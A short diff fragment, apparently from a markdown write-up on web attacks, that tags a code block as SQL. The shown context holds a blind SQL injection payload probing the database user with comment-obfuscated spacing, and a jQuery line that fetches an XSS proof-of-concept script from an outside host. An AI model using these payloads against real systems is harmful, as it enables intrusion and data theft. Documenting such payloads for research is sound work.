@@ -41,7 +41,7 @@ $.get('https://edwinfoudil.com/poc/jqueryxss.js')
 
 Final example: 
 
-```
+```sql
 444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
 ```
 
